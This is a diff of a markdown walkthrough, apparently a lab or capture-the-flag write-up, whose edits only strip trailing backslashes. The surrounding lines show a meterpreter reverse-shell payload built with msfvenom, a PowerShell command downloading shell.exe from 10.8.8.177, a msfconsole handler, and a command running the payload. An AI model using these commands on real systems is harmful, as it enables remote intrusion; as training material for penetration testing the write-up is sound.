@@ -62,15 +62,15 @@ msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai 
 ```
 
 Then we upload it to the remote machine.\
-On the remote machine.\
+On the remote machine.
 ```
 cd %TEMP%
 powershell -c "Invoke-WebRequest http://10.8.8.177/shell.exe -OutFile shell.exe"
 ``` 
-*Tip: It's common to find C:\Windows\Temp is world writable!*\
+*Tip: It's common to find C:\Windows\Temp is world writable!*
 
 
-Then we set up a listener on our host machine with msfconsole.\
+Then we set up a listener on our host machine with msfconsole.
 ```
 msfconsole
 use exploit/multi/handler
@@ -80,7 +80,7 @@ set LPORT 9002
 run
 ```
 
-Back on the remote machine, we execute the following command to run shell.exe.\
+Back on the remote machine, we execute the following command to run shell.exe.
 ```
 powershell -c "Start-Process shell.exe"
 ```
